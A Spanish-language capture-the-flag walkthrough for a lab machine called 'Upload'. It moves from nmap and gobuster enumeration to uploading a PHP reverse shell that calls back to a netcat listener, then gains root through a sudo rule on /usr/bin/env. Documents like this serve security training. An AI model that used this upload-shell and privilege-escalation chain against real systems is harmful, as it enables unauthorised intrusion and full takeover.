# Upload

## Reconocimiento y Enumeración.
Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Como tenemos abierto el puerto 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p80 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p22,80`: Escaneo de los puertos 80 (HTTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.

```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Parece por el título que sea un sistema para subir un archivo y vamos a enumerar la página, mientras vemos lo que contiene, dejamos haciendo fuzzing con gobuster.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php, txt, html
```

En la página encontramos un sistema de subir archivos que probaremos a subir un archivo con una reverse shell, para obtener acceso a la máquina.

![upload](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAiEAAAEHCAYAAAB4CpYxAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABxuSURBVHhe7d15tBTF3cbx5L8kZjnJyZu8ycmq0ejrkqiggohxQVQiCKgo4muMigsqLrhFiIhoVFTccUfENYgIUdlEQRRQQDZB9kVA9k0QBMTfe59iut+ee4s7l7n3WgXzrXM+x56u7p52+tD1TFX13G/tueeeBgAA8E0jhAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggAAAiCEAIAAIIghAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggAAAiCEAIAAIIghAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggAAAiCEAIAAIIghAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggQQJ06dSxbWrZs6d0uBhdffHHuLM22bdvm3aYmtWvXLvduZps3b86r6927d67G7N13382rA7DrIYSgJGUbVpVGjRp5t5P27dvnttpeGjZs6N1uZ+zuIeTYY4/N7VH1st9++7l9CSFA6SCEoCQRQqrumw4h2vfWW291OnfunHdcQgiweyGEoCQRQqquJkLIpEmTbOjQoZX64x//6D1WFiEE2L0QQlCSCCFVVxMhRMfwbbezCCHA7oUQgpJUUyFkwIABubVmzz33nPs2f/fdd9usWbPsyy+/tDVr1rhtjjrqqLxjViWE/OlPf3LHmjhxon3++ee2detWW7lypY0cOdKuu+4622effSrsI/vvv7/dcccd6X5fffWVrV692oYPH25/+9vfvPuIjjllyhR33mvXrrW3337bmjVrZm3bts2d5TcTQqozJ+TPf/6z3XfffTZ16lTbsGGD23/evHn25JNPus+8/PYAwiKEoCTVVAh56aWXcmvN+vfvb8OGDcu9yi/Lly+3Bg0apPsVCiFNmjSxJUuW5Gr9Zdy4cXbwwQfn7afXM2bMyG3hL//617/y9pEnnngiV5tf1Ig/8MADuVdxh5DjjjvOFi9enKutWPR5HnPMMXn7AAiLEIKSVFMhRL0fSVm/fr1t3LjR7rnnHrv00kvt+eefz9VsLwopyX6VhRAFiWwAWbhwoXXs2NEuuugie/TRR13PRlI0lyLZT7KN9IoVK+z88893gebpp5/OrTXXo5INRM2bN8/VbC/qQVEQuOSSS2zUqFEuCCQl1hCy995754Uv1TVt2tSOP/5469WrV26t2UcffZR3PABhEUJQkmoqhGQbRZWrr746b98XX3wxV2O2ZcsWN8Si9ZWFkPvvvz+31uyLL76wI488Mq0TvUe2aMgkqevTp48bRpEbbrghXa9GWkMsSbn++uvTupdffjm31tw2yTnKvvvum9e7EGsIUehLioagsv8PovCRlDPOOCOvDkA4hBCUpNoIIWrA1Whn923RokWudntp3bq1W19ZCJk+fXpurdmrr76ark8oUKxbty63hbk5EOW38cket1u3bun62bNn59aa9e3bN28feeihh3K1xYeQQk/H9OjRI923mBCSDVIffPCBe9w3K/v/8PDDD+cdE0A4hBCUpNoIIePHj8/bT/SNPFs6dOjg1u8ohOy1116uoU/K7bffnne8RPabfXaYRwFFQzeaL6IegR2Ve++9N91HE1GTkg0niauuuipXW3wIKVR0vsm+xYQQBY+qliFDhuQdE0A4hBCUpAsvvDDXJG0vmj/g205uuumm3FbbS7169dK6bKOoSanZ/UShIFs6derk1u8ohBxwwAG5NduL3jt7vMT777+f2yL/fQcNGpRbu73oaRr1dMycOTNvbkcSQhR6sqVLly7psRKaV5KUWEOInuqpalFgyR4TQDiEEJQkzQvIFk3C9G0n5Z8cyQ65ZBvFsWPH5u0n5XtCrrnmGre+sp6Q7MTTHfWEaHgjKa+99ppb16ZNm9ya7SUJPInsxM1sT0g2nNx11115+8i1116bq413TsiYMWNyaytO1gUQL0IISpKeQPn6669zzZbZwIEDvdupZ0KP1yZl2rRpefXZRlG9Dur5yNYrXGRLq1at3Pqqzgnp169fuj6hEKTfwEhKEhw0NyQpGorJ7qPfFNHTO0nJhhD9jkZSfHNC9BsbSYk1hGQfldbnl90HQLwIIShZ2SENFfUc/OEPf0jrFVQUTrJFf88ke4xso6iiBjRbn306RnMvFGq0vrIQkg0Tejqmfv36aZ1ozkdSFKT0+xharwmXSdGjwupVSfbRXJRsyU7OVPBIiia8Zn975MADD3ThKimxhpDs0zEq5YfX9Jlq7owC1WmnnZZXByAcQghKlhqq7FCEin5bY/To0TZhwoQKdZMnT67w9Eu2UVTIUA9E165d3TyKZ555JlezvegJjmS/ykJI+d8JmT9/vnukVsfU74ToUd+k6HdKkv3KT6DVj4w1btzYhatNmzbZnDlzcjXb/19Up5Bx1lln5dZuL6q74oor7PLLL3e/GaIglBSFnuT9KvNNhxD19GSf8tF1vPHGG+3ss892T94kReEsO6cHQFiEEJQ0NezZx113VPRT6QoO5ffPNorvvPOO+3EvX/n000+tbt266X6VhRDRD4wtXbo0V+sv6qXJhiItz507N1ebXxSsTjrppNyr/y/JI8P6fRFfUQDRX7LNlvJDTj7fdAgRharKPjMFMV3v7D4AwiKEoOQpEOhvtGhiqf7GiiaGqvHVXAlN+tTfW8kObWRlG8URI0a436TQUIdCh3osli1bZi+88EJeAJFCIUT0d1A0d0M9E5rPoV861Td8TbzUr6eW314OP/xwN49k1apVrgFXKNExkrBy2223ueEVHUt/3yZ5NFnBQj/nrv9nnbe2eeONN1zDfuKJJ+bOcnsp/0NgPiFCiBx66KHuN0E0L0S9HqLPQPslw1YA4kEIAaqhUKMIANgxQghQDYQQACgeIQSoBkIIABSPEAJUAyEEAIpHCAGqgRACAMUjhAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCEAACAIQggAAAiCEAIAAIIghAAAgCAIIQAAIAhCCAAACIIQAgAAgiCEAACAIAghAAAgCEIIAAAIghACAACCIIQAAIAgCCG7iIMOOsgaNGhgjRo1suOPPx4AgtK9SPck3Zt89yygKgghu4C6devm/cPP3ggAIITsvUj3KN+9CyiEEBI5fctI/sHXr1/f6tSpY4ceeigABKV7ke5JSRihRwTFIIRETt2d+geuf+y+GwEAhKR7k+5Rulf57mFAZQghkdO3DKEHBECMdG9K7lO+exhQGUJI5PQNQ3z/+AEgBsl9yncPAypDCIkcIQRA7AghKBYhJHKEEACxI4SgWISQyBFCAMSOEIJiEUIiRwgBEDtCCIpFCIkcIQRA7AghKBYhJHKEEACxI4SgWISQyBUTQho3Ptk6dOhk3bs/VdL0Geiz8H1GAGoOIQTFIoREbmdDiBpdNcA9evS0JUtW2rJlq0qS/t/1GeizIIgAtYsQgmIRQiK3syFE3/4fe6yXt2EuRfos9Jn4PisANYMQgmIRQiK3syFE3/xLuQekPH0W+kx8nxWAmkEIQbEIIZErJoT4GuNSRggBahchBMUihESOEFJ9hBCgdhFCUCxCSOQIIdVHCAFqFyEExSKERK4mQ8ihh9ax73znO7bHHnvYD3/4Q6tXr74NHDjEu+3upLIQMmXKFEd/jjy7/rLLLrNx48blrauqLl262JIlS2zhwoV21lln2W233WaNGzd2dYMHD7bbb7+9wj614Zt8rx155ZVX7JFHHvHWYfdBCEGxCCGRq+kQ8tRTz7jlBQsW23XX3WA//elPyxrMFRW23Z0UCiFr1qyp0FgXG0J0rTZt2mQnnniiHX744XbkkUfa8uXLrX379q5+VwshN910k/Xp08dbVxWEkNJACEGxCCGRq60QIrNnz7dvf/vbNmvWvLztdjeFQoh6KlauXJn3ORcbQtTz8dlnn3nrZFcLIdr/rbfe8tZVBSGkNBBCUCxCSORqM4Tcffe9dtRRR6evu3W7x9q0+V/7619PsR/84Af28suvuPWPPvq47bvvvvbjH//YGjY82kaP/tCtP+WUpnbllVel+9988y1um08//cy9XrRoqRv2+fjjT2zs2Al2zDHHup6XX/3qV3n7de/+gO2zzz7285//t7VufbbNn78orasJhUJI27Zt7fHHH7fXX389XV8+hOgaqFFftWqVCxn3339/hSGcU045xdauXWvbtm1zoWbq1KluvbZXONFy+WCgYZrhw4fbihUrbM6cOXbppZemdVndunVzx1GvjY7bvHlzt/6II46w5557zhYvXuyGgLp3757uU/69zj333LJr8bE7t7Fjx1rTpk3TumOOOcb9/6tuwYIFduedd9oFF1xgGzZssC1btrj1t9xyi9u2snNW3YgRI9znMH/+fJsxYwYhpAQQQlAsQkjkajqE/OhHP7Kf/ezn9l//9TP71re+ZR07/jOtVwj5/vd/YE8+2dOmT59tCxcusX79Btjvfvd7GzNmrBvCadfuctt7733KGr1l1qPHY3bIIYek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)

Vamos a ver que hemos encontrado con gobuster y vemos que tenemos un directorio en http://172.17.0.2/uploads/ que tiene pinta que es donde se subirán los archivos.

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 1361]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/upload.php           (Status: 200) [Size: 1357]
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 1361]
/server-status        (Status: 403) [Size: 275]
```

## Explotación.

Ahora para subir la reverse shell vamos a https://github.com/pentestmonkey/php-reverse-shell y utilizamos la reverse-shell.php que han creado ellos que funciona muy bien. Solo hay que copiar el código en un archivo php en nuestro ordenador y sustituir la ip y el puerto en el que vamos a estar en escucha.
```bash
$ip = '172.17.0.1';  // CHANGE THIS
$port = 4443;       // CHANGE THIS
```

Subimos el archivo y vemos que acepta archivos php.

![UPLOAD-shell.PNG]

Si vamos al directorio http://172.17.0.2/uploads/ vemos que nuestro archivo está subido y solo tendremos que hacer click sobre él y estar a la espera en nuestro equipo con netcat en puerto que habíamos indicado en el script.

```bash
nc -lvnp 4443
```

Y obtendremos la reverse shell directamente como el usuario data.
```bash
❯ nc -lvnp 4443
listening on [any] 4443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 59230
Linux ebd3a0fc70ea 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 x86_64 x86_64 GNU/Linux
 12:14:20 up 42 min,  0 users,  load average: 0.06, 0.11, 0.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$  
```
## Escalada de privilegios.

Ahora comprobamos empezamos la escalada de privilegios viendo si hay algún archivo con permisos sudo que podamos utilizar siendo el usuario www-data.

```bash
sudo -l
```

```bash
$ sudo -l
Matching Defaults entries for www-data on ebd3a0fc70ea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on ebd3a0fc70ea:
    (root) NOPASSWD: /usr/bin/env
$ 
```

Vemos que podemos utilizar el binario /usr/bin/env y para ello podemos ir a [GTFOBins](https://gtfobins.github.io/)y ver como explotar ese binario como muchos otros. En este caso simplemento tenemos que poner el siguiente comando.

```bash
sudo /usr/bin/env /bin/bash
```

Y con ello ya obtenemos una bash como root.
```bash
$ sudo /usr/bin/env /bin/bash
whoami
root
```

Para más comodidad podemos hacer un tratamiento de la tty.

```bash
script /dev/null -c bash
```

-- Hacemos Ctrl + c --

```bash
stty -raw echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

```bash
root@ebd3a0fc70ea:/# whoami
whoami
root
root@ebd3a0fc70ea:/# 
```
